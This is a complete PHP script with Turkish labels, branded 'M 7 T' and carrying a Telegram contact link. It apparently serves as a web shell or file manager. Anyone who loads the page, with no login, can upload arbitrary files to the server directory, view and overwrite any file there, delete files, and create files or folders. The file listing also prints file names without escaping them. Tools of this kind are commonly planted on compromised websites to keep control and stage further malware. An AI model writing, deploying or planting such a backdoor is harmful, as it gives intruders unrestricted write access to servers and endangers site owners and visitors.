<?php
$current_dir = __DIR__;  
$mesaj = '';

// === MESAJ SİSTEMİ ===
if (isset($_GET['m'])) {
    $mesaj = html_entity_decode(urldecode($_GET['m']));
}

// === 1. Dosya Yükleme ===
if (isset($_FILES['dosya'])) {
    $dosya = $_FILES['dosya'];
    if ($dosya['error'] === 0) {
        $hedef = $current_dir . '/' . basename($dosya['name']);
        if (move_uploaded_file($dosya['tmp_name'], $hedef)) {
            $mesaj = basename($dosya['name']) . " yüklendi.";
        } else $mesaj = "Yükleme başarısız.";
    } else $mesaj = "Dosya hatası.";
    header("Location: ?m=" . urlencode($mesaj));
    exit;
}

// === 2. Dosya Düzenleme & Kaydetme ===
$duzenlenecek = '';
$icerik = '';
if (isset($_GET['edit'])) {
    $dosya = basename($_GET['edit']);
    $yol = $current_dir . '/' . $dosya;
    if (is_file($yol) && is_readable($yol)) {
        $duzenlenecek = $dosya;
        $icerik = file_get_contents($yol);
    }
}
if (isset($_POST['kaydet'])) {
    $dosya = basename($_POST['dosya']);
    $yol = $current_dir . '/' . $dosya;
    if (is_writable($yol)) {
        file_put_contents($yol, $_POST['icerik']);
        $mesaj = "$dosya kaydedildi.";
    } else $mesaj = "Yazma izni yok.";
    header("Location: ?m=" . urlencode($mesaj));
    exit;
}

// === 3. Dosya/Klasör Silme ===
if (isset($_GET['sil'])) {
    $dosya = basename($_GET['sil']);
    $yol = $current_dir . '/' . $dosya;
    if (is_file($yol)) {
        unlink($yol);
        $mesaj = "$dosya silindi.";
    } elseif (is_dir($yol) && count(glob("$yol/*")) === 0) {
        rmdir($yol);
        $mesaj = "Klasör silindi.";
    }
    header("Location: ?m=" . urlencode($mesaj));
    exit;
}

// === 4. Yeni Dosya/Klasör Oluştur ===
if (isset($_POST['olustur'])) {
    $ad = trim($_POST['ad']);
    $tip = $_POST['tip'];
    if (!empty($ad)) {
        $yol = $current_dir . '/' . $ad;
        if (!file_exists($yol)) {
            if ($tip === 'dosya') {
                file_put_contents($yol, '');
                $mesaj = "$ad oluşturuldu.";
            } else {
                mkdir($yol);
                $mesaj = "$ad klasörü oluşturuldu.";
            }
        } else $mesaj = "Zaten var.";
    } else $mesaj = "Ad boş olamaz.";
    header("Location: ?m=" . urlencode($mesaj));
    exit;
}

// === Dosya Listeleme ===
function listele() {
    global $current_dir;
    $dosyalar = array_diff(scandir($current_dir), ['.', '..']);
    echo '<table width="100%" cellpadding="8" cellspacing="0">';
    echo '<tr bgcolor="#4c566a"><th>Adı</th><th>Boyut</th><th>İşlem</th></tr>';
    foreach ($dosyalar as $d) {
        $yol = $current_dir . '/' . $d;
        $boyut = is_file($yol) ? round(filesize($yol)/1024, 2) . " KB" : "-";
        echo "<tr><td>";
        if (is_dir($yol)) echo "📁 <b>$d</b>";
        else echo "📄 <a href='?edit=" . urlencode($d) . "'>$d</a>";
        echo "</td><td>$boyut</td><td>";
        echo "<a href='?sil=" . urlencode($d) . "' onclick=\"return confirm('Silinsin mi?')\">[Sil]</a>";
        echo "</td></tr>";
    }
    echo '</table>';
}
?>

<!DOCTYPE html>
<html><head><meta charset="utf-8">
<title>M 7 T</title>
<style>
    body{font-family:Consolas,monospace;background:#2e3440;color:#eceff4;margin:0;padding:20px;}
    .box{background:#3b4252;padding:15px;border-radius:8px;margin:10px 0;border:1px solid #4c566a;}
    input,button,textarea{background:#4c566a;color:#eceff4;border:1px solid #5e81ac;padding:8px;margin:5px 0;}
    button{background:#a3be8c;color:#2e3440;border:none;cursor:pointer;}
    a{color:#88c0d0;}
    .msg{padding:10px;background:#a3be8c;color:#2e3440;font-weight:bold;border-radius:5px;}
    table{width:100%;border-collapse:collapse;}
    th{background:#4c566a;color:#a3be8c;}
    td,th{padding:8px;border-bottom:1px solid #4c566a;}
</style>
</head><body>

<div class="box">
<center><h2> M 7 T </h2></center>
<b>M U R 7 T</b>
</div>

<?php if($mesaj): ?><div class="msg"><?php echo htmlspecialchars($mesaj); ?></div><?php endif; ?>

<div class="box">
<h3>Dosya Yükle</h3>
<form method="POST" enctype="multipart/form-data">
<input type="file" name="dosya" required> <button>Yükle</button>
</form>
</div>

<div class="box">
<h3>Yeni Dosya/Klasör</h3>
<form method="POST">
<input type="text" name="ad" placeholder="dosya.txt veya klasor" required>
<select name="tip"><option value="dosya">Dosya</option><option value="klasor">Klasör</option></select>
<button name="olustur">Oluştur</button>
</form>
</div>

<?php if($duzenlenecek): ?>
<div class="box">
<h3>Düzenle: <?php echo htmlspecialchars($duzenlenecek); ?></h3>
<form method="POST">
<input type="hidden" name="dosya" value="<?php echo htmlspecialchars($duzenlenecek); ?>">
<textarea name="icerik" style="height:400px;width:100%"><?php echo htmlspecialchars($icerik); ?></textarea><br>
<button name="kaydet">Kaydet</button> <a href="?">Vazgeç</a>
</form>
</div>
<?php else: ?>
<div class="box">
<h3>Mevcut Dosyalar / Klasörler</h3>
<?php listele(); ?>
</div>
<?php endif; ?>

<div class="box"><small>Contact: <a href=https://t.me/konusartik>t.me/konusartik</a></small></div>
</body></html>